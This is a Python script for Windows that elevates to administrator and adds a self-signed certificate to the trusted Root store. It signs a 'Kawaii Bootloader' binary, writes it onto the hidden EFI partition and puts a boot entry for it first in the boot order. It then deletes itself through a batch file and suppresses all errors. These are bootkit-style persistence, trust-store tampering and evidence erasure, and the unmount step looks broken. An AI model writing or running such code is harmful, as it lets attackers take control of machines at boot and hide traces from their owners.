import ctypes
import sys
import os
import subprocess
import time
import re
import platform
from tkinter import messagebox, Tk

def admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not admin():
    root = Tk()
    root.withdraw()
    messagebox.showinfo(
        "Admin Rights Required",
        "This script needs administrator privileges. It will restart as administrator."
    )
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, " ".join([f'"{arg}"' for arg in sys.argv]), None, 1
    )
    sys.exit()

DIR = os.path.dirname(os.path.abspath(__file__))
BOOT = "bootloader.bin"
EFI_PATH = r"\EFI\BOOT"
BOOT_NAME = "Kawaii Bootloader"
DRV = "S"
CERT_NAME = "kawaii_uwu"
CERT = os.path.join(DIR, "kawaii_cert.cer")
TEMP_PS1 = os.path.join(DIR, "temp_cert.ps1")

def run_cmd(cmd):
    shell = isinstance(cmd, str)
    return subprocess.run(cmd, check=True, capture_output=True, text=True, shell=shell).stdout

def cert():
    script = f"""
$ErrorActionPreference='Stop'
$c=New-SelfSignedCertificate -DnsName "{CERT_NAME}" -CertStoreLocation "Cert:\\CurrentUser\\My" -KeyExportPolicy Exportable -NotAfter (Get-Date).AddYears(5)
$p="{CERT}"
$e=Get-ChildItem Cert:\\CurrentUser\\My | Where-Object {{$_.Subject -like "*{CERT_NAME}*"}}
if($e){{Export-Certificate -Cert $e -FilePath $p -Force}}
if(Test-Path $p){{Import-Certificate -FilePath $p -CertStoreLocation "Cert:\\CurrentUser\\Root"}}
"""
    with open(TEMP_PS1, "w", encoding="utf-8") as f:
        f.write(script)
    run_cmd(f"powershell -ExecutionPolicy Bypass -File \"{TEMP_PS1}\"")
    if os.path.exists(TEMP_PS1):
        os.remove(TEMP_PS1)

def sign():
    st = None
    for r, d, f in os.walk(DIR):
        if "signtool.exe" in f:
            st = os.path.join(r, "signtool.exe")
            break
    if not st:
        raise FileNotFoundError("signtool.exe missing")
    bl = os.path.join(DIR, BOOT)
    if not os.path.exists(bl):
        raise FileNotFoundError(f"{BOOT} missing")
    pfx = os.path.join(DIR, "kawaii_cert.pfx")
    pwd = "<add_your_own_password>" #add your password here
    run_cmd([st, "sign", "/fd", "SHA256", "/f", pfx, "/p", pwd, bl])

def mount():
    tmp = 'tmp_list.txt'
    vol = None
    try:
        with open(tmp, 'w') as f:
            f.write("list volume\n")
        out = run_cmd(f"diskpart /s {tmp}")
    finally:
        if os.path.exists(tmp): os.remove(tmp)
    for line in out.splitlines():
        if "FAT32" in line and ("System" in line or "Hidden" in line):
            m = re.search(r'Volume\s+(\d+)', line)
            if m:
                vol = m.group(1)
                break
    if not vol:
        raise Exception("EFI volume not found")
    tmp_mount = 'tmp_mount.txt'
    content = f"select volume {vol}\nassign letter={DRV}\nexit\n"
    try:
        with open(tmp_mount, 'w') as f: f.write(content)
        run_cmd(f"diskpart /s {tmp_mount}")
    finally:
        if os.path.exists(tmp_mount): os.remove(tmp_mount)
    time.sleep(1)
    return f"{DRV}:"

def umount(d):
    tmp = 'tmp_umount.txt'
    content = f"select volume {d.strip(':')}\nremove all\nexit\n"
    try:
        with open(tmp, 'w') as f: f.write(content)
        run_cmd(f"diskpart /s {tmp}")
    except: pass
    finally:
        if os.path.exists(tmp): os.remove(tmp)

def boot():
    if not os.path.exists(BOOT):
        raise Exception(f"{BOOT} missing")
    sign()
    d = None
    try:
        d = mount()
        base = os.path.join(d, EFI_PATH.strip('\\'))
        dest = os.path.join(base, BOOT)
        os.makedirs(base, exist_ok=True)
        src = os.path.join(os.getcwd(), BOOT)
        run_cmd(["copy", "/Y", src, dest])
        if not os.path.exists(dest) or os.path.getsize(dest)==0:
            raise Exception("Copy failed")
        bcd_path = os.path.join(EFI_PATH, BOOT).replace("/", "\\")
        out = run_cmd(["bcdedit","/create","/d",BOOT_NAME,"/application","bootmgr"])
        m = re.search(r'\{[0-9a-fA-F-]{36}\}', out)
        if not m: raise Exception("GUID extract failed")
        g = m.group(0)
        run_cmd(["bcdedit","/set",g,"device",f"partition={d}"])
        run_cmd(["bcdedit","/set",g,"path",bcd_path])
        run_cmd(["bcdedit","/displayorder",g,"/addfirst"])
    finally:
        if d: umount(d)

def main():
    os_name = platform.system()
    admin_flag = False
    if os_name=="Windows":
        try: subprocess.check_call(["net","session"],stdout=subprocess.PIPE,stderr=subprocess.PIPE); admin_flag=True
        except: pass
    if not admin_flag: raise PermissionError("Run as admin")
    cert()
    boot()
    exe = sys.executable
    bat = os.path.join(DIR, "delete_me.bat")
    target = exe if exe.endswith('.exe') else __file__
    with open(bat,'w') as f:
        f.write(f'@echo off\nping 127.0.0.1 -n 3 >nul\n')
        f.write(f'del "{target}" /f /q\n')
        f.write(f'del "%~f0" /f /q\n')
    subprocess.Popen([bat], shell=True)

if __name__=="__main__":
    try:
        main()
    except:
        pass
